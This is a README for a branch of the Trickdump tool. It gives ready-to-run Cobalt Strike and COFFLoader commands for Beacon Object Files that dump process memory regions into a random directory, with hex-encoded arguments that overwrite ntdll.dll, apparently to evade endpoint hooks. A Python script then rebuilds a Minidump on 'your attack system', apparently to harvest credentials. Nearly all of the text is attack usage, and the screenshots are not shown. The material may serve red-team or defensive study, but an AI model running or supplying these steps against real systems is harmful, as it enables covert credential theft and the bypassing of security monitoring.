# Trickdump - "bof-flavour" branch

This branch implements the same functionality as the main branch but using BOFs (Beacon Object Files).

You can execute the files with Cobalt Strike using "bof" or with TrustedSec's [COFFLoader](https://github.com/trustedsec/COFFLoader):

```
bof lock_bof.o [disk/knowndlls/debugproc]
```

```
COFFLoader64.exe go lock_bof.o [disk/knowndlls/debugproc]
```

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF1.png)

```
bof shock_bof.o [disk/knowndlls/debugproc]
```

```
COFFLoader64.exe go shock_bof.o [disk/knowndlls/debugproc]
```

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF2.png)

```
bof barrel_bof.o [disk/knowndlls/debugproc]
```

```
COFFLoader64.exe go barrel_bof.o [disk/knowndlls/debugproc]
```

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF3.png)

There is one optional argument to overwrite the ntdll.dll library, the possible values are:
- "disk" ("0e0000000a0000006400690073006b000000" if you want to use COFFLoader)
- "knowndlls" ("18000000140000006b006e006f0077006e0064006c006c0073000000" if you want to use COFFLoader)
- "debugproc" ("180000001400000064006500620075006700700072006f0063000000" if you want to use COFFLoader)

Examples:

```
bof lock_bof.o disk
```

```
COFFLoader64.exe go lock_bof.o 0e0000000a0000006400690073006b000000
```

![img7](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF7.png)

```
bof shock_bof.o knowndlls
```

```
COFFLoader64.exe go shock_bof.o 18000000140000006b006e006f0077006e0064006c006c0073000000
```

![img8](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF8.png)

```
bof barrel_bof.o debugproc
```

```
COFFLoader64.exe go barrel_bof.o 180000001400000064006500620075006700700072006f0063000000
```

![img9](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF9.png)


I could not create a ZIP file using BOF files so the memory region dumps are created in a directory with a random name.

Use the updated *create_dump.py* script to generate the Minidump file in your attack system using the *-d* parameter for the directory path:

```
python3 create_dump.py [-l LOCK_JSON] [-s SHOCK_JSON] [-b BARREL_JSON] [-d BARREL_DIRECTORY] [-o OUTPUT_FILE]
```

![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF4.png)


-------------------------

## All in one

If you prefer to execute only one file, the Trick BOF generates the 3 JSON files and the directory with the memory regions:

```
bof trick_bof.o [disk/knowndlls/debugproc]
```

```
COFFLoader64.exe go trick_bof.o [disk/knowndlls/debugproc]
```

It creates all the files at the same time:

![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF5.png)

Optionally you can use the first argument to overwrite ntdll.dll in this case too:

![img10](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF10.png)

Then you can create the Minidump file using *create_dump.py*:

![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF6.png)
